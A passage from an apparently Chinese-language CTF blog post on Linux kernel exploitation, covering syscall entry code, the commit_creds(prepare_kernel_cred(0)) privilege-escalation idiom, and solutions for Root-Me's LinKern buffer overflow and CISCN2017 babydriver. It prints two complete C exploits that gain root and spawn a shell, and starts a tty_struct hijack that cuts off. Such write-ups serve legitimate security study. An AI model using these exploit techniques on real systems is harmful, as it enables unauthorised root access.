release</td></tr><tr><td align="center">remove</td><td align="center">rmmod</td><td align="center">module_exit()</td></tr></tbody></table><h3 id="状态切换-3"><a href="#状态切换-3" class="headerlink" title="状态切换[3]"></a>状态切换[3]</h3><h4 id="user-space-to-kernel-space"><a href="#user-space-to-kernel-space" class="headerlink" title="user space to kernel space"></a>user space to kernel space</h4><p>当发生 <code>系统调用</code>，<code>产生异常</code>，<code>外设产生中断</code>等事件时，会发生用户态到内核态的切换，具体的过程为：</p><ol><li>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</li><li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</li><li>通过 push 保存各寄存器值，具体的 <a href="http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S">代码</a> 如下:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line"> &#x2F;* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 *&#x2F;</span><br><span class="line"> SWAPGS_UNSAFE_STACK</span><br><span class="line">   </span><br><span class="line"> &#x2F;* 保存栈值，并设置内核栈 *&#x2F;</span><br><span class="line"> movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line"> movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">&#x2F;* 通过push保存寄存器值，形成一个pt_regs结构 *&#x2F;</span><br><span class="line">&#x2F;* Construct struct pt_regs on stack *&#x2F;</span><br><span class="line">pushq  $__USER_DS      &#x2F;* pt_regs-&gt;ss *&#x2F;</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  &#x2F;* pt_regs-&gt;sp *&#x2F;</span><br><span class="line">pushq  %r11             &#x2F;* pt_regs-&gt;flags *&#x2F;</span><br><span class="line">pushq  $__USER_CS      &#x2F;* pt_regs-&gt;cs *&#x2F;</span><br><span class="line">pushq  %rcx             &#x2F;* pt_regs-&gt;ip *&#x2F;</span><br><span class="line">pushq  %rax             &#x2F;* pt_regs-&gt;orig_ax *&#x2F;</span><br><span class="line">pushq  %rdi             &#x2F;* pt_regs-&gt;di *&#x2F;</span><br><span class="line">pushq  %rsi             &#x2F;* pt_regs-&gt;si *&#x2F;</span><br><span class="line">pushq  %rdx             &#x2F;* pt_regs-&gt;dx *&#x2F;</span><br><span class="line">pushq  %rcx tuichu    &#x2F;* pt_regs-&gt;cx *&#x2F;</span><br><span class="line">pushq  $-ENOSYS        &#x2F;* pt_regs-&gt;ax *&#x2F;</span><br><span class="line">pushq  %r8              &#x2F;* pt_regs-&gt;r8 *&#x2F;</span><br><span class="line">pushq  %r9              &#x2F;* pt_regs-&gt;r9 *&#x2F;</span><br><span class="line">pushq  %r10             &#x2F;* pt_regs-&gt;r10 *&#x2F;</span><br><span class="line">pushq  %r11             &#x2F;* pt_regs-&gt;r11 *&#x2F;</span><br><span class="line">sub $(6*8), %rsp      &#x2F;* pt_regs-&gt;bp, bx, r12-15 not saved *&#x2F;</span><br></pre></td></tr></table></figure><ol start="4"><li><p>通过汇编指令判断是否为 x32_abi。</p></li><li><p>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</p></li></ol><h4 id="kernel-space-to-user-space"><a href="#kernel-space-to-user-space" class="headerlink" title="kernel space to user space"></a>kernel space to user space</h4><ol><li>通过 <code>swapgs</code> 恢复 GS 值</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）</li></ol><blockquote><p>iretq中q后缀，是quadra word的意思，也就是说64位指令。还存在iretd, iretw等。</p></blockquote><h3 id="内核态函数-3"><a href="#内核态函数-3" class="headerlink" title="内核态函数[3]"></a>内核态函数[3]</h3><p>相比用户态库函数，内核态的函数有了一些变化</p><ul><li>printf() -&gt; printk()，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果</li><li>memcpy() -&gt; copy_from_user()/copy_to_user()<br>  copy_from_user() 实现了将用户空间的数据传送到内核空间<br>  copy_to_user() 实现了将内核空间的数据传送到用户空间</li><li>malloc() -&gt; kmalloc()，内核态的内存分配函数，和 malloc() 相似，但使用的是 <code>slab/slub 分配器</code></li><li>free() -&gt; kfree()，同 kmalloc()</li></ul><p><strong>提权函数</strong></p><p>kernel 管理进程，因此 kernel 也记录了进程的权限。kernel 中有两个可以方便的改变权限的函数：</p><ul><li><code>int commit_creds(struct cred *new)</code></li><li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code></li></ul><p>从函数名也可以看出，执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 root 权限（root 的 uid，gid 均为 0）</p><p>执行 <code>commit_creds(prepare_kernel_cred(0))</code> 也是最常用的提权手段，两个函数的地址都可以在 <code>/proc/kallsyms</code> 中查看（较老的内核版本中是 <code>/proc/ksyms</code>。通常需要root权限查看。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo grep commit_creds /proc/kallsyms</span></span><br></pre></td></tr></table></figure><p><code>struct cred</code> 每个进程都有这么个结构，如果能修改，也就获得了对应权限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="keyword">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="keyword">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="keyword">void</span>*put_addr;</span><br><span class="line"><span class="keyword">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="keyword">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="ret2usr-Rootme-buffer-overflow-basic-1"><a href="#ret2usr-Rootme-buffer-overflow-basic-1" class="headerlink" title="ret2usr | Rootme buffer overflow basic 1"></a>ret2usr | <a href="https://www.root-me.org/en/Challenges/App-System/LinKern-x86-Buffer-overflow-basic-1">Rootme buffer overflow basic 1</a></h3><p>题目有以下几个文件：</p><ul><li>bzImage：内核文件</li><li>ch1.c：模块源代码</li><li>initramfs.img：用cpio打包成的初始文件系统</li><li>passwd.img：flag所在，在qemu中普通用户无法读取</li><li>run：set-uid程序，运行._start_vm启动qemu</li><li>._start_vm：启动脚本</li></ul><p>虚拟机中<code>/init</code>文件，在Linux启动的最后一步将会执行此脚本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 挂载 devtmpfs 类型的文件系统，设备名设置为 none，挂载目录为 /dev</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> devtmpfs 的功用是在 Linux 核心启动早期建立一个初步的 /dev，</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 令一般启动程序不用等待 udev，缩短 GNU/Linux 的开机时间。[4]</span></span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> flag</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line">mkdir -p /passwd</span><br><span class="line">mount -t ext2 -o ro /dev/sda /passwd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> share</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 挂载与主机共享的文件夹</span></span><br><span class="line">mkdir -p /mnt/share</span><br><span class="line">mount -t 9p -o trans=virtio rootme /mnt/share/ -oversion=9p2000.L,posixacl,sync</span><br><span class="line">chmod 777 /mnt/share/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> module</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装漏洞模块</span></span><br><span class="line">insmod /lib/modules/*/rootme/*.ko</span><br><span class="line">chmod 666 /dev/tostring </span><br><span class="line"><span class="meta">#</span><span class="bash"> mmap_min_addr to 0 <span class="keyword">for</span> the challenge to be simpler <span class="keyword">for</span> now ;)</span></span><br><span class="line">echo 0 &gt; /proc/sys/vm/mmap_min_addr</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> shell</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line">cat /etc/issue</span><br><span class="line">export ENV=/etc/profile</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"> </span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">umount /dev</span><br><span class="line"> </span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure><p>在tostring模块中可以发现，tostring结构中<code>tostring_stack</code>存在溢出的可能，在<code>tostring_write</code>中并未作出限制。<code>tostring_stack</code>后面就是一个函数指针。同时该kernel并没有随机化，通过<code>/proc/kallsyms</code>获取<code>prepare_kernel_cred</code>和<code>commit_creds</code>函数的地址。</p><p>调试中可以用条件断点<code>b tostring_write if (int)tostring==64</code>比较方便。</p><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/kernel_pwn/LinKern_x86-Buffer_overflow_basic_1/exp.c">exp</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *eip;</span><br><span class="line">    <span class="keyword">uint32_t</span> cs;</span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;</span><br><span class="line">    <span class="keyword">void</span> *esp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_tf_work</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;pushl %cs;popl tf+4;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushfl;popl tf+8;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushl %esp;popl tf+12;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushl %ss;popl tf+16;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    tf.eip = &amp;getshell;</span><br><span class="line">    tf.esp -= <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="keyword">void</span>* (*prepare_kernel_cred)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *)<span class="number">0xc10711f0</span>;</span><br><span class="line"><span class="keyword">void</span>* (*commit_creds)(<span class="keyword">void</span> *) KERNCALL = (<span class="keyword">void</span> *)<span class="number">0xc1070e80</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;mov $tf, %esp;&quot;</span></span><br><span class="line">        <span class="string">&quot;iret;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> recv[<span class="number">255</span>];</span><br><span class="line">    <span class="keyword">char</span> padding[<span class="number">9</span>] = <span class="string">&quot;AAAAAAAA&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> eip[<span class="number">5</span>];</span><br><span class="line">    init_tf_work();</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/tostring&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; ++i) &#123;</span><br><span class="line">        write(fd, padding, <span class="keyword">sizeof</span>(padding)<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *((<span class="keyword">void</span>**)(eip)) = &amp;payload;</span><br><span class="line">    write(fd, eip, <span class="keyword">sizeof</span>(eip)<span class="number">-1</span>);</span><br><span class="line">    read(fd, recv, <span class="number">255</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="UAF-amp-ROP-CISCN2017-babydriver"><a href="#UAF-amp-ROP-CISCN2017-babydriver" class="headerlink" title="UAF &amp; ROP | CISCN2017 babydriver"></a>UAF &amp; ROP | CISCN2017 babydriver</h3><h4 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> request, ...)</span></span>;</span><br></pre></td></tr></table></figure><p>第一个参数是文件描述符，第二个是程序对设备的控制指令，后面则是指令的补充参数。</p><p>对于Linux，一切皆文件。而Linux提供的读写文件的函数（read, write, lseek等）对于许多的设备不好进行控制，所以提供了ioctl函数。request就是设备驱动程序提供的控制指令。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><code>babydriver_init</code>，<code>babydriver_exit</code>是常规的创建和销毁过程。</p><p><code>babyioctl</code>定义了一个ioctl指令来分配指定大小的buf。</p><p><code>babyopen</code>默认分配一个64字节的buf。<code>kmem_cache_alloc_trace</code>似乎是<code>kmalloc</code>优化的结果，还不了解后续再研究。<a href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/slab.h#L458">src</a></p><p><code>babyread</code>/<code>babywrite</code> 从buf读取数据/往buf写入数据，都对大小进行了验证，不存在溢出。</p><p>漏洞点在于该符号设备全局共享一个buf，所以同时打开两次，这两次共享一个buf，释放其中一个就发生了UAF。</p><h4 id="exploit1"><a href="#exploit1" class="headerlink" title="exploit1"></a>exploit1</h4><p>打开两次设备，使用ioctl控制buf为<code>struct cred</code>的大小，然后close其中一次打开，另一次打开就指向了一块已经释放的区域，fork产生的新进程就会分配得到该区块用来存储<code>cred</code>，通过另一次打开的设备进行覆写改变进程uid、gid，就获得了root权限。</p><p>在这里计算<code>struct cred</code>的大小是一个难点，我并未找到很简单的方法来计算。因为这个结构体里面也有许多的结构体，我觉得直接看源码并不那么容易计算。。。一层套一层，还有对齐的问题。先直接用了，后面再找办法[todolist2]&lt;已解决&gt;，大小为0xa8。<a href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118">src</a></p><p><a href="https://github.com/clxsh/ctf_wps/blob/master/others/kernel_pwn/ciscn2017-babydriver/exp1.c">exp</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">char</span> zero[<span class="number">36</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, zero, <span class="keyword">sizeof</span>(zero));</span><br><span class="line">        <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)  &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fork failed!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="exploit2"><a href="#exploit2" class="headerlink" title="exploit2"></a>exploit2</h4><p>思路：利用gadgets关闭SMEP，内核没有开启地址随机，直接<code>commit_creds(prepare_kernel_cred(0))</code>，然后跳转到用户程序getshell。</p><p>这里使用覆写<code>tty_struct</code>的方法来获得程序控制流：</p><p><code>tty_struct</code></p><details>    <summary>struct tty_struct</summary>    <p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> magic;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span>     &lt; -- 这里</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="comment">/* Protects ldisc changes: 